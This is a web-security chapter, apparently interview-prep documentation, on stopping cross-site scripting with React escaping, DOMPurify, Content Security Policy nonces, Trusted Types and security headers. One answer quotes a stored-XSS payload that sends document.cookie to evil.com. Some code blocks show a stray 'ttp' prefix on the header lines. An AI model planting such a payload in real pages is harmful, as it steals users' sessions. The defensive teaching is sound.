---
title: "XSS & Content Security Policy"
sidebar_label: "11.2 XSS & Content Security Policy"
description: "Stored, reflected, DOM-based XSS, and a CSP that actually blocks them."
sidebar_position: 2
---

Cross-Site Scripting is the attack class in which an adversary injects JavaScript into the application's page and the browser executes it with the application's origin privileges. From there the script can read cookies that lack the `HttpOnly` attribute, exfiltrate everything in `localStorage`, and issue Application Programming Interface requests as the authenticated user. The damage is bounded only by what the user could legitimately do.

> **Acronyms used in this chapter.** API: Application Programming Interface. AST: Abstract Syntax Tree. CDN: Content Delivery Network. COEP: Cross-Origin Embedder Policy. COOP: Cross-Origin Opener Policy. CSP: Content Security Policy. DB: Database. DOM: Document Object Model. HSTS: HTTP Strict Transport Security. HTML: HyperText Markup Language. HTTP: Hypertext Transfer Protocol. HTTPS: HTTP Secure. JS: JavaScript. JSX: JavaScript XML. SHA: Secure Hash Algorithm. SSR: Server-Side Rendering. URL: Uniform Resource Locator. UUID: Universally Unique Identifier. XSS: Cross-Site Scripting.

## Three flavours

Cross-Site Scripting comes in three flavours that differ by where the malicious payload originates. Stored Cross-Site Scripting persists the payload in the application's database, so every visit to the affected page serves it; this is the worst variant because the attack reaches every user without further interaction. The canonical example is a comment field that accepts raw HyperText Markup Language and renders it back without sanitisation. Reflected Cross-Site Scripting carries the payload in a Uniform Resource Locator parameter that the server echoes into the response; the attack requires tricking the user into clicking a crafted link. The canonical example is `?error=<script>...</script>` rendered into a flash-message banner. Document Object Model-based Cross-Site Scripting is entirely client-side: JavaScript reads from `location.hash` or `document.referrer` and writes to `innerHTML`; the server never sees the payload, so server-side filters do not help.

## React (and modern frameworks) protect by default

Text inside JSX is escaped:

```tsx
<div>{userInput}</div>
```

Even if `userInput` is `<script>alert(1)</script>`, React renders it as text. **Unless** you use `dangerouslySetInnerHTML`:

```tsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

Or you set an attribute that's an executable URL:

```tsx
<a href={userInput}>click</a>
```

If `userInput` is `javascript:alert(1)`, that runs. Validate URLs.

## Sanitisation when you must render HTML

```tsx
import DOMPurify from "dompurify";

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />;
```

Better yet: parse to a structured representation (Markdown → AST → React elements) so you never touch `innerHTML`. Libraries: `react-markdown` with a strict transformer.

## The ban-list in your codebase

A short list of JavaScript patterns produces nearly every Cross-Site Scripting bug; gate them behind explicit code review and an ESLint rule that flags new occurrences. The patterns to search for and refuse without justification: `dangerouslySetInnerHTML` in React; assignment to `innerHTML` or `outerHTML`; `document.write`; `eval`; `new Function`; the string variants of `setTimeout` and `setInterval` (`setTimeout("...", ...)`).

```js
// .eslintrc — flag the dangerous sinks.
"no-restricted-syntax": [
  "error",
  { selector: "CallExpression[callee.name='eval']", message: "Avoid eval()" },
  { selector: "JSXAttribute[name.name='dangerouslySetInnerHTML']", message: "Avoid dangerouslySetInnerHTML; sanitise via DOMPurify if you must." }
]
```

## Content Security Policy

Content Security Policy is the browser-enforced layer that says "even if the application's code somehow loads attacker JavaScript, the browser refuses to execute it". It is a defence-in-depth control that complements the application's own input sanitisation and is absolutely worth shipping in production.

A modern strict Content Security Policy header looks as follows:

```h
ttpContent-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m';
  style-src 'self' 'nonce-r4nd0m';
  img-src 'self' data: https:;
  font-src 'self' data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;
```

The directives that matter most for a senior framing: `default-src 'self'` is the fallback for any directive not explicitly listed and constrains every resource to same-origin by default. `script-src 'self' 'nonce-XYZ'` requires inline scripts to carry the per-request nonce and external scripts to come from the same origin; the server generates a fresh nonce per request and embeds it in the `<script>` tags it emits. `style-src 'self' 'nonce-XYZ'` applies the same constraint to inline stylesheets. `frame-ancestors 'none'` prevents the site from being embedded in any iframe and replaces the older `X-Frame-Options` header (which is the anti-clickjacking control). `object-src 'none'` eliminates legacy Flash and applet vectors. `base-uri 'self'` prevents base-tag injection that would relocate relative Uniform Resource Locators. `form-action 'self'` prevents forms from posting to attacker-controlled origins. `upgrade-insecure-requests` automatically upgrades any HTTP subresource to HTTP Secure.

### Nonces vs hashes vs `'unsafe-inline'`

The choice between the three patterns determines the policy's strength. The `'unsafe-inline'` keyword permits any inline script and effectively disables the Cross-Site Scripting protection; it should not appear in a production policy. The nonce pattern (`'nonce-...'`) generates a unique, unguessable value per request and attaches it to every legitimately inline `<script nonce="...">`; the browser refuses to execute any inline script lacking the matching nonce. This is the standard for Server-Side Rendered applications. The hash pattern (`'sha256-...'`) embeds the hash of the inline script content in the policy; the browser refuses any inline script whose hash does not match. Hashes are friendly to static content where the inline script is known at build time.

Next.js App Router generates nonces automatically when the Content Security Policy is set through middleware.

```ts
// middleware.ts
import { NextResponse } from "next/server";

export function middleware(req: Request) {
  const nonce = btoa(crypto.randomUUID());
  const csp = [
    `default-src 'self'`,
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
    `style-src 'self' 'nonce-${nonce}'`,
    `img-src 'self' data: https:`,
    `connect-src 'self'`,
    `frame-ancestors 'none'`,
    `base-uri 'self'`,
    `form-action 'self'`,
    `object-src 'none'`,
  ].join("; ");

  const headers = new Headers(req.headers);
  headers.set("x-nonce", nonce);

  const res = NextResponse.next({ request: { headers } });
  res.headers.set("Content-Security-Policy", csp);
  return res;
}
```

The `'strict-dynamic'` keyword is the modern approach: a script that loads with a valid nonce is trusted, and any scripts it loads inherit that trust. This avoids the operational burden of enumerating every Content Delivery Network Uniform Resource Locator the application might load (analytics, error reporting, advertising) and keeps the policy short.

## Reporting CSP violations

```h
ttpContent-Security-Policy:
  ...;
  report-to csp-endpoint;
  report-uri https://example.com/csp-report
```

Combine the report directives with the [Reporting Application Programming Interface](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API). In production, set `Content-Security-Policy-Report-Only` first to discover violations without breaking the page, observe the reports for a sufficient window, fix the violations the team is responsible for, and then move to enforcing `Content-Security-Policy`.

## Trusted Types

The newest hardening layer forces all writes to dangerous sinks (`innerHTML`, `outerHTML`, `document.write`) to pass through a Trusted Types policy. The browser refuses raw string assignments to these sinks; the only legal value is a `TrustedHTML` (or similar) produced by a registered policy.

```h
ttpContent-Security-Policy: require-trusted-types-for 'script'; trusted-types default;
```

```ts
const policy = trustedTypes.createPolicy("default", {
  createHTML: (s) => DOMPurify.sanitize(s),
});

element.innerHTML = policy.createHTML(userInput);
```

With Trusted Types enabled, `element.innerHTML = userInput` throws unless `userInput` was produced by a registered policy. This is the closest the browser comes to a structural "no Cross-Site Scripting" guarantee. Currently Chromium, Edge, and Opera support the feature; Firefox is in progress.

## Other security headers worth shipping

```h
ttpStrict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

In a Next.js application, set these headers in `next.config.js` via the `headers()` function or in middleware. The defaults that browsers apply when no header is set are not safe; explicit configuration is required.

## Attacks CSP doesn't stop

Content Security Policy is not a complete defence; several attack classes require additional mitigations. Document Object Model clobbering — where a named `<form>` element overrides a global like `document.something` — is partially mitigated by Trusted Types but requires careful coding to avoid relying on globals that user-supplied HyperText Markup Language can clobber. Tabnabbing through `target="_blank"` links — where the new tab can read `window.opener` and rewrite the original tab's location — is mitigated by always adding `rel="noopener noreferrer"`. Side-channel attacks such as Spectre and Meltdown require Cross-Origin Opener Policy and Cross-Origin Embedder Policy to isolate the origin from cross-origin script execution.

## Key takeaways

The senior framing for Cross-Site Scripting and Content Security Policy: React and modern frameworks escape by default; `dangerouslySetInnerHTML` and `javascript:` URLs are the recurring operational hazards. Use DOMPurify when user-supplied HyperText Markup Language must be rendered. Content Security Policy with per-request nonces plus `'strict-dynamic'` is the senior baseline. Trusted Types is the next level for teams that can adopt it. Ship the security headers (HTTP Strict Transport Security, Cross-Origin Opener Policy, Cross-Origin Embedder Policy, Permissions-Policy) explicitly because the browser defaults are not safe.

## Common interview questions

1. Three types of Cross-Site Scripting. An example of each.
2. Why is `dangerouslySetInnerHTML` dangerous?
3. Walk through a strong Content Security Policy. What does `'strict-dynamic'` do?
4. What does `frame-ancestors 'none'` replace?
5. How can Cross-Site Scripting be detected in production?

## Answers

### 1. Three types of XSS. An example of each.

Stored Cross-Site Scripting persists the malicious payload in the application's database, so every page view that renders the affected record serves the payload. The canonical example is a comment field that accepts raw HyperText Markup Language: an attacker posts `<script>fetch("https://evil.com?c=" + document.cookie)</script>` and every subsequent visitor sends their cookies to the attacker. Reflected Cross-Site Scripting carries the payload in a Uniform Resource Locator parameter that the server echoes back: `https://app.example.com/search?q=<script>...</script>` rendered into the page produces the same exfiltration path, but only against users tricked into clicking the link. Document Object Model-based Cross-Site Scripting executes entirely client-side: JavaScript reads from `location.hash` (which the server never sees) and writes to `innerHTML`, producing the same vulnerability without any server-side echo.

**Trade-offs / when this fails.** The mitigations differ. Stored Cross-Site Scripting is fixed by sanitising on output (or, defensively, on input) using a library such as DOMPurify. Reflected Cross-Site Scripting is fixed by escaping every echoed value, which React and Next.js do by default. Document Object Model-based Cross-Site Scripting is fixed by treating client-side data sources (`location`, `document.referrer`, `postMessage` payloads) as untrusted and never assigning them directly to `innerHTML`. Content Security Policy is the defence-in-depth layer that catches mistakes in any of the three.

### 2. Why is dangerouslySetInnerHTML dangerous?

The property bypasses React's automatic escaping and writes the supplied string directly into the Document Object Model as HyperText Markup Language. If the supplied string contains untrusted content — a user comment, a third-party Application Programming Interface response, anything not produced by the application's own trusted templating — the resulting HyperText Markup Language can include `<script>` tags, event handlers (`<img onerror="...">`), and `javascript:` URLs that execute as the application's origin. The naming is a deliberate, alarming reminder that the property is dangerous; React's authors named it that way to make code review for the property a cultural reflex.

```tsx
// Senior pattern when raw HTML must be rendered.
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />;
```

**Trade-offs / when this fails.** DOMPurify's defaults block dangerous tags and attributes but allow common HyperText Markup Language; if the application needs an even narrower allowlist (only `<b>`, `<i>`, `<a>`), configure DOMPurify explicitly. Better still, parse the input to a structured representation (Markdown to Abstract Syntax Tree to React elements via `react-markdown`) so `innerHTML` is never touched.

### 3. Walk through a strong CSP. What does 'strict-dynamic' do?

A strong policy starts with `default-src 'self'` as the catch-all and constrains script and style execution through nonces. Each request generates a fresh, unguessable nonce; the server embeds the nonce in every `<script>` tag it emits; the browser refuses to execute any inline script that lacks the matching nonce. The policy also forbids inline event handlers, `javascript:` URLs, and (with `object-src 'none'`) legacy plugin vectors. The `frame-ancestors 'none'` directive prevents the page being embedded in any iframe, replacing the older `X-Frame-Options` header.

The `'strict-dynamic'` keyword extends the nonce trust transitively: a script that loads with a valid nonce is trusted, and any script it dynamically loads (`document.createElement("script")`) inherits the trust. This is the modern pattern for applications that load Content Delivery Network resources because it eliminates the operational burden of enumerating every Content Delivery Network host in the policy; the application's own loader controls what runs and the policy trusts that decision.

```h
ttpContent-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self' 'nonce-r4nd0m';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  upgrade-insecure-requests;
```

**Trade-offs / when this fails.** A nonce that leaks (cached responses with the same nonce, server-side rendering that reuses nonces across requests) defeats the protection; the nonce must be generated fresh per request and never cached. Some legacy third-party scripts cannot be loaded under `'strict-dynamic'` because they themselves use patterns the policy forbids; either replace the script or bracket the policy temporarily on the affected page.

### 4. What does frame-ancestors 'none' replace?

The `frame-ancestors 'none'` directive replaces the older `X-Frame-Options: DENY` header. Both prevent the page from being embedded in an iframe, which is the foundation of clickjacking attacks where an attacker overlays the application's User Interface on top of their own page and tricks the user into clicking a button on the application without realising it. The Content Security Policy version is more flexible — `frame-ancestors 'self' https://trusted-partner.com` allows specific origins — and is the modern standard. `X-Frame-Options` is still honoured by older browsers; some teams ship both during transition.

**Trade-offs / when this fails.** When the application legitimately needs to be embedded (a payment widget, a documentation viewer), use `frame-ancestors` with an explicit allowlist of trusted parent origins. The `'none'` value is the safe default; loosen it only when the embedding requirement is real and the trust relationship with the parent is documented.

### 5. How can XSS be detected in production?

The standard technique is to deploy Content Security Policy in report-only mode (`Content-Security-Policy-Report-Only`) with `report-uri` or `report-to` directives pointing at an aggregation endpoint. Every blocked execution generates a report containing the violation type, the offending source, the policy directive that fired, and a Uniform Resource Locator for context. The reports are aggregated, deduplicated, and triaged; legitimate violations are fixed by updating the page or the policy, and any violation that looks like an actual injection attempt triggers a security-incident workflow.

```h
ttpContent-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self' 'nonce-...';
  report-to csp-endpoint
```

```ts
// CSP report ingestion endpoint.
app.post("/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  logger.warn("csp_violation", req.body);
  res.status(204).send();
});
```

**Trade-offs / when this fails.** Report-only mode produces a steady stream of false positives from legitimate browser extensions and third-party scripts; the team must build a triage workflow that distinguishes attacker-generated violations from background noise. Sentry, Datadog, and dedicated tools such as Report-URI provide aggregation and deduplication. The transition from report-only to enforcing should happen only after the noise has been triaged and the team is confident the policy reflects the application's legitimate needs.

## Further reading

- [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/).
- [Strict CSP](https://web.dev/articles/strict-csp).
- [Trusted Types](https://web.dev/articles/trusted-types).
